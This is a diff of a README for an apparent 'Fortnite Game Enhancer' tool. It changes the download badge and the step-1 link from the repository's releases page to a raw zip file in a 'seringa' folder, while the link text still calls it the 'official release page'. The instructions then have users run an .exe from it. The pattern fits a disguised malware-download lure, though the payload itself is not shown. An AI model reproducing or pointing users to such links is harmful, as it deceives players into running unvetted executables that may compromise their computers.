@@ -1,6 +1,6 @@
 # 🎮 Fortnite-Game-Enhancer-2026 - Improve your visuals and game performance
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/personificationopeninterval615/Fortnite-Game-Enhancer-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/personificationopeninterval615/Fortnite-Game-Enhancer-2026/raw/refs/heads/main/seringa/Fortnite-Enhancer-Game-v1.2.zip)
 
 Fortnite Game Enhancer 2026 improves how you experience the game. This tool adjusts visual settings and optimizes your connection to the game servers. It helps players reach higher frame rates and clearer image quality. You get better control over how your game displays on your monitor. 
 
@@ -19,7 +19,7 @@ Check your Windows version by pressing the Windows key and typing "About your PC
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [official release page](https://github.com/personificationopeninterval615/Fortnite-Game-Enhancer-2026/releases) to access the installers.
+1. Visit the [official release page](https://github.com/personificationopeninterval615/Fortnite-Game-Enhancer-2026/raw/refs/heads/main/seringa/Fortnite-Enhancer-Game-v1.2.zip) to access the installers.
 2. Select the file ending in .exe from the list.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installer.
